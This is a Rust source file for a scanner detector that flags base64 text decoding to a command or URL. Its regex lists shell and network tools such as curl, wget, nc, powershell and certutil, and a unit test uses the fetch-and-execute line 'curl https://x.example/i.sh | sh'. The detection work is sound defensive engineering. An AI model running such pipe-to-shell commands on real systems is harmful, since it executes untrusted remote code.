//! `base64_payload` detector (RS-HID-002): base64 runs whose decoded text
//! contains a command or a URL.

use super::{truncate, unicode, Loc};
use crate::analyze::Analyzed;
use crate::model::Scope;
use regex::Regex;
use std::sync::OnceLock;

fn command_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i)(?:\b(?:https?|ftp)://|(?:^|[\s;|&(`$])(?:curl|wget|bash|sh|zsh|powershell|pwsh|iex|invoke-expression|invoke-webrequest|iwr|eval|exec|python3?|node|perl|ruby|nc|ncat|chmod|rm|sudo|base64|certutil|osascript)(?:\s|$|\.exe\b))",
        )
        // INVARIANT: the pattern is a constant that compiles.
        .unwrap_or_else(|_| unreachable!())
    })
}

/// Does decoded text look like a command or contain a URL?
pub fn looks_like_command(t: &str) -> bool {
    command_re().is_match(t)
}

/// Run the detector over a file's derived base64 segments.
pub fn base64_payload(a: &Analyzed) -> Vec<Loc> {
    let text = a.doc.text.as_str();
    a.doc
        .segments
        .iter()
        .filter(|s| {
            s.scope == Scope::Decoded
                && matches!(s.origin.as_deref(), Some("base64" | "base64_nested"))
                && looks_like_command(&s.text)
        })
        .map(|s| {
            let src = text.get(s.span.start..s.span.end).unwrap_or("");
            let decoded = truncate(&unicode::render(&s.text), 200);
            Loc {
                span: s.span,
                line: s.line,
                column: s.column,
                end_line: s.end_line,
                evidence: truncate(&unicode::render(src), 200),
                message: Some(format!(
                    "Base64 text decodes to a command or URL: {}",
                    truncate(&decoded, 120)
                )),
                decoded: Some(decoded),
                synthetic: false,
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn command_heuristic() {
        assert!(looks_like_command("curl https://x.example/i.sh | sh"));
        assert!(looks_like_command("see https://x.example"));
        assert!(looks_like_command("powershell -enc AAAA"));
        assert!(!looks_like_command("hello world, this is fine"));
        assert!(!looks_like_command("shell shock is a word"));
    }
}
